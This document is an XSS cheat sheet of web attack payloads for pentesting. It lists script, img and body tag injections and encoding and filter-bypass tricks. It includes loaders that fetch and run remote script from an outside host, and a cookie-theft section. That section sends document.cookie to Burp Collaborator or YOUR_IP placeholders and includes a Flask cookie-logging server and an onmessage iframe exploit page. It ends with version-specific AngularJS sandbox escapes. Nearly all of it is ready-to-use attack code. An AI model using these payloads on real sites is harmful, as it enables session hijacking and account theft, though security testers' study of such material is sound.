# XSS Cheatsheet

Resources: 
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- https://portswigger.net/research/xss-without-parentheses-and-semi-colons
- https://github.com/tennc/fuzzdb/blob/master/attack-payloads/xss/xss-rsnake.txt

---

XSS Payloads references below:
- https://thegetch.github.io/x

---

## Common payloads

### In `<body>` tag:

```JS
<body onload=alert('test1')>
```

### In `<script>` tags:

```JS
<script>alert(1);</script>
```

```JS
<script>alert("XSS");</script>
```

- URL encoded:`%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%58%53%53%22%29%3b%3c%2f%73%63%72%69%70%74%3e`
- HTML encoded:`&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x22;&#x58;&#x53;&#x53;&#x22;&#x29;&#x3b;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;`

No quotes:

```JS
<script src=//thegetch.github.io/x></script>
```

With quotes:

```JS
<script src="//thegetch.github.io/x"></script>
```

Invalid script source:

```JS
<script x src = //thegetch.github.io/x></script>
```

Invalid script source - all caps:
```JS
< SCRIPT X SRC = //THEGETCH.GITHUB.IO/XS></SCRIPT>
```

No parentheses:

```JS
<script>onerror=alert;throw 1337</script>
```

No parentheses or semicolon:

```JS
<script>{onerror=alert}throw 1337</script>
```

Throw with expression:

```JS
<script>throw onerror=alert,'some string',123,'haha'</script>
```

### css:

```JS
<style>body{background:url('javascript:var x=document.createElement("script");x.src="https://thegetch.github.io/x";document.body.appendChild(x)')}</style>
```

### In `<img>` tags:

 Create script on image error, invalid src:
 
```JS
<img src=x onerror='var x=document.createElement("script");x.src="//thegetch.github.io/x";document.body.appendChild(x);'>
```

 Create script on image error, no src :

```JS
<img src onerror='var x=document.createElement("script");x.src="//thegetch.github.io/x";document.body.appendChild(x);'>
```

Escaped quotes:

```JS
<img src=x onerror='var x=document.createElement(\"script\");x.src = "//thegetch.github.io/x";document.body.appendChild(x);'>
```

 Create script on image mouseover:

```JS
<img src=# onmouseover='var x=document.createElement("script");x.src = "//thegetch.github.io/x";document.body.appendChild(x);'>
```

Simple img tag XSS, no quotes:

```JS
<img src=x onerror=alert(1) />
```

Simple img tag XSS, with quotes:

```JS
<img src=x onerror="alert(1)" />
```

Simple img tag XSS, alert string:

```JS
<img src=x onerror=alert("XSS") /> 
```

JavaScript protocol, within quotes:

```JS
<IMG SRC="javascript:alert('Vulnerable');">
```

JavaScript protocol, no double quotes, single quotes alert:

```JS
<IMG SRC=javascript:alert('XSS')>
```

JavaScript protocol, no double quotes, double quotes alert:
```JS
<IMG SRC=javascript:alert("XSS")>
```

JavaScript protocol, simple obfuscation:

```JS
<IMG SRC=JaVaScRiPt:alert('XSS')>
```

JavaScript protocol, within backticks:

```JS
<IMG SRC=`javascript:alert("RSnake says,'XSS'")`>
```

Dangling markup within img tag:

```JS
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
```

JavaScript protocol, alert obfuscation/blacklist bypass:

```JS
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
```

### Using Data URIs: 

*from https://www.paladion.net/blogs/bypass-xss-filters-using-data-uris*

Start with Base64-decoded payload: 

```JS
<script>alert("Hello");</script>
```

Base64-encode the payload:

```JS
PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
```

Use within data URI:

```JS
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
```

In data URI image:

```JS
data:image/gif;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpIC8+
```

### Base64 eval:

```JS
eval(atob('dmFyIHg9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7eC5zcmMgPSAiLy90aGVnZXRjaC5naXRodWIuaW8veCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh4KTs='))
```

### jQuery:

```JS
$.getScript('//thegetch.github.io/x');
```

Examples:

```JS
;}$(document).ready(function(){$.getScript(%27//thegetch.github.io/x%27)});x=function(){a=%27
```

```JS
&vulnfield=
thegetch%27);}});};$.getScript(%27//thegetch.github.io/x%27);x=function(){getDate(function(){x=function(){x=(%27
&otherfield=blah.....
```

```JS
&vulnfield=
*/%27];$.getScript(%27//thegetch.github.io/x%27);/*
&otherfield=blah.....	  	
```

### In json format:
```JS
"certificationVersion":"https://thegetch.github.io/xss.svg"
```

### Stealing Cookies 

Stored XSS to steal cookies (using Burp Collaborator):

```JS
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{method: 'POST',mode: 'no-cors',body:document.cookie});</script> 
```

onmouseover:

```JS
onmouseover='document.location=%22https://<your_Burp_Collab>.burpcollaborator.net?%22.concat(document.cookie)
```

or

```JS
onmouseover='setTimeout(function()%7Bdocument.location=%22https://<your_Burp_Collab>.burpcollaborator.net?%22.concat(document.cookie);%7D,1)
```

or

```JS
onmouseover='document.write(%22<img src=https://<your_Burp_Collab>.burpcollaborator.net?%22.concat(document.cookie).concat(%22 />%22))
```

or

```js
<script>
var i = new Image();
i.src="//<your_Burp_Collab>.burpcollaborator.net?q="+document.cookie;
</script>
```

Stored XSS to steal cookies (using Flask in Python):

```python
from flask import Flask, request, redirect
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def cookie():

    cookie = request.args.get('c')
    f = open("cookies.txt","a")
    f.write(cookie + ' ' + str(datetime.now()) + '\n')
    f.close()

    return redirect("http://answers/")

if __name__ == "__main__":
    app.run(host = '0.0.0.0', port=5000)
```

Payload to inject:
```JS
<script>document.location="http://YOUR_IP:5000/cookie/" + document.cookie </script>
```

Or

```
<script src=http://YOUR_IP:5000/?c="+document.cookie;></script>
```

Or

```
<script type="text/javascript">document.location="http://YOUR_IP:5000/?c="+document.cookie;</script>
```

- *From <https://medium.com/@laur.telliskivi/pentesting-basics-cookie-grabber-xss-8b672e4738b2>*


Steal cookie with **onmessage** function:

If only `onmessage` if allowed and the app does not use postMessage, can phish user to attacker site, create iframe to vulnerable request, and force the postMessage:

XSS POC: `search=test%22%3E<body%20onmessage=alert(1)>`

Attacker's exploit server code to steal cookie:
```html
<html>
<body>
    <iframe title="target" style="width:500px; height: 500px;"></iframe>
    <button>attack</button>

    <script>
        const targetFrame = document.querySelector('iframe');
        const targetOrigin = 'https://<VICTIM_SITE>/?search=test%22%3E%3Cbody%20onmessage=document.location=%22https://<YOUR_BURP_COLLAB>.burpcollaborator.net?%22.concat(document.cookie)%3E';

        targetFrame.src = targetOrigin;

        const windowMessageButton = document.querySelector('button');
        windowMessageButton.addEventListener('click', () => {
            targetFrame.contentWindow.postMessage('hello there', "*");
        });
        window.onmessage = (event) => {
            console.log(`Received message: ${event.data}`);
        };
        setTimeout(() => {
            targetFrame.contentWindow.postMessage('hello there', "*");
        }, 4000);
    </script>
</body>
</html>

```

### Other examples:

Obfuscated `details` tag and `ontoggle` event to open a prompt that is Unicode obfuscated:

```
'"--><DeTails/opEn/oNTOggLe=(pro\u006dpt)``//
```

- *source: somedev on twitter*

---

### AngualrJS XSS:
- *from <https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs>*

List of Sandbox bypasses:

1.0.1 - 1.1.5
```
{{constructor.constructor('alert(1)')()}}
```

1.2.0 - 1.2.1
```
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

1.2.2 - 1.2.5
```
{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
```

1.2.6 - 1.2.18
```
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
```

1.2.19 - 1.2.23
```
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
```
1.2.24 - 1.2.29
```
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
```

1.3.0
```
{{!ready && (ready = true) && (
      !call
      ? $$watchers[0].get(toString.constructor.prototype)
      : (a = apply) &&
        (apply = constructor) &&
        (valueOf = call) &&
        (''+''.toString(
          'F = Function.prototype;' +
          'F.apply = F.a;' +
          'delete F.a;' +
          'delete F.valueOf;' +
          'alert(1);'
        ))
    );}}
```

1.3.1 - 1.3.2
```
{{
    {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
    'a'.constructor.prototype.charAt=''.valueOf; 
    $eval('x=alert(1)//'); 
}}
```

1.3.3 - 1.3.18
```
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join; 

  'a'.constructor.prototype.charAt=[].join;
  $eval('x=alert(1)//');  }}
```

1.3.19
```
{{
    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join; 
    $eval('x=alert(1)//'); 
}}
```

1.3.20
```
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

1.4.0 - 1.4.9
```
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

1.5.0 - 1.5.8
```
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}} 
```

1.5.9 - 1.5.11
```
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```

>=1.6.0
```
{{constructor.constructor('alert(1)')()}}
```